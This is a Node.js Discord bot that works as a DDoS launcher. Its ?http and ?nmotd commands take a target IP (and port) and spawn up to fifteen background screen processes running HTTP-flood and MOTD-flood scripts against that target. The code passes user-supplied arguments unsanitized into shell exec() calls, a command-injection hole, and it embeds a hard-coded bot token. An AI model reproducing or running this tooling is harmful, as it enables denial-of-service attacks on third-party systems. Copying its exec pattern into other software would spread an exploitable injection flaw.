const colors = require('colors')
const { Client, Intents } = require('discord.js');
const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });
const { exec } = require('child_process');
const httphub = "966121588816756776"
const nodejshub = "966294691819683920"
console.log('███╗░░██╗░█████╗░██████╗░███████╗██╗░░██╗██╗░░░██╗██████╗░░░██╗██████╗░'.rainbow);
console.log('████╗░██║██╔══██╗██╔══██╗██╔════╝██║░░██║██║░░░██║██╔══██╗░██╔╝╚════██╗'.rainbow);
console.log('██╔██╗██║██║░░██║██║░░██║█████╗░░███████║██║░░░██║██████╦╝██╔╝░░█████╔╝'.rainbow);
console.log('██║╚████║██║░░██║██║░░██║██╔══╝░░██╔══██║██║░░░██║██╔══██╗╚██╗░░╚═══██╗'.rainbow);
console.log('██║░╚███║╚█████╔╝██████╔╝███████╗██║░░██║╚██████╔╝██████╦╝░╚██╗██████╔╝'.rainbow);
console.log('╚═╝░░╚══╝░╚════╝░╚═════╝░╚══════╝╚═╝░░╚═╝░╚═════╝░╚═════╝░░░╚═╝╚═════╝░'.rainbow);
client.on('ready', () => {
    exec("sudo apt install screen")
    console.log('Logged in as', client.user.username + "...");
})
var cmdmap = {
    http: cmd_http,
    nmotd: cmd_motd,
    help: cmd_help,
}
function cmd_http(msg, args) {
    if(msg.channel.id == httphub) {
        if(args.length == 2) {
            if(args[1] == "weak") {
                exec("screen -dm node files/ddos.js " + args[0] + " files/http.txt 30")                      
                msg.channel.send("Weak HTTP Flood send to " + args[0] + " for 30 Seconds")
            } else if(args[1] == "middle") {
                exec("screen -dm node files/ddos.js " + args[0] + " files/http.txt 30")   
                exec("screen -dm node files/ddos.js " + args[0] + " files/http.txt 30")   
                exec("screen -dm node files/ddos.js " + args[0] + " files/http.txt 30")   
                exec("screen -dm node files/ddos.js " + args[0] + " files/http.txt 30")   
                exec("screen -dm node files/ddos.js " + args[0] + " files/http.txt 30")                                      
                msg.channel.send("Middle HTTP Flood send to " + args[0] + " for 30 Seconds")
            } else if(args[1] == "strong") {
                exec("screen -dm node files/ddos.js " + args[0] + " files/http.txt 30")   
                exec("screen -dm node files/ddos.js " + args[0] + " files/http.txt 30")   
                exec("screen -dm node files/ddos.js " + args[0] + " files/http.txt 30")   
                exec("screen -dm node files/ddos.js " + args[0] + " files/http.txt 30")   
                exec("screen -dm node files/ddos.js " + args[0] + " files/http.txt 30")       
                exec("screen -dm node files/ddos.js " + args[0] + " files/http.txt 30")   
                exec("screen -dm node files/ddos.js " + args[0] + " files/http.txt 30")   
                exec("screen -dm node files/ddos.js " + args[0] + " files/http.txt 30")   
                exec("screen -dm node files/ddos.js " + args[0] + " files/http.txt 30")   
                exec("screen -dm node files/ddos.js " + args[0] + " files/http.txt 30")       
                exec("screen -dm node files/ddos.js " + args[0] + " files/http.txt 30")   
                exec("screen -dm node files/ddos.js " + args[0] + " files/http.txt 30")   
                exec("screen -dm node files/ddos.js " + args[0] + " files/http.txt 30")   
                exec("screen -dm node files/ddos.js " + args[0] + " files/http.txt 30")   
                exec("screen -dm node files/ddos.js " + args[0] + " files/http.txt 30")                                                                      
                msg.channel.send("Strong HTTP Flood send to " + args[0] + " for 30 Seconds")           
            } else {
                msg.channel.send("HTTP Strength Types: weak,middle,strong")
            }      
        }else {
            msg.channel.send("Syntax: ?http (IP (Attack Strength)")
        }

    }else {
        msg.channel.send("HTTP Attacks only in http-hub")
    }
}
function cmd_motd(msg, args) {
    if(msg.channel.id == nodejshub) {
        if(args.length == 2) {
            exec("screen -dm node files/motd.js " + args[0] + " " + args[1] + " 30")
            exec("screen -dm node files/motd.js " + args[0] + " " + args[1] + " 30")
            exec("screen -dm node files/motd.js " + args[0] + " " + args[1] + " 30")
            exec("screen -dm node files/motd.js " + args[0] + " " + args[1] + " 30")
            exec("screen -dm node files/motd.js " + args[0] + " " + args[1] + " 30")
            exec("screen -dm node files/motd.js " + args[0] + " " + args[1] + " 30")
            exec("screen -dm node files/motd.js " + args[0] + " " + args[1] + " 30")
            exec("screen -dm node files/motd.js " + args[0] + " " + args[1] + " 30")
            exec("screen -dm node files/motd.js " + args[0] + " " + args[1] + " 30")
            exec("screen -dm node files/motd.js " + args[0] + " " + args[1] + " 30")
            msg.channel.send("NMOTD send to " + args[0] + args[1] + " for 30 Seconds")
        } else {
            msg.channel.send("Syntax: ?nmotd (IP) (PORT)")
        }
    } else {
        msg.channel.send("NMOTD only in in nodejs-hub")
    }
}

function cmd_help(msg, args) {
    if(msg.channel.id == httphub) {
        msg.channel.send("Methods: ")
        msg.channel.send("?http (IP) (STRENGTH<weak,middle,strong>)")
    }else if(msg.channel.id == nodejshub) {
        msg.channel.send("Methods: ")
        msg.channel.send("?nmotd (IP) (PORT)")
    }
}

client.on('message', (msg) => {
    var cont = msg.content,
        author = msg.member,
        chan = msg.channel,
        guild = msg.guild
    if (author.id != client.user.id && cont.startsWith("?")) {
        var invoke = cont.split(' ')[0].substr(1),
            args =  cont.split(' ').slice(1)
        if (invoke in cmdmap) {
            cmdmap[invoke](msg, args)
        }
    } 
})
client.login('ODQyMzcxNjM0Nzk5MzEyOTQ2.YJ0VuA.UKoDrKa8LPEWNuhqZiGK3dtKezE');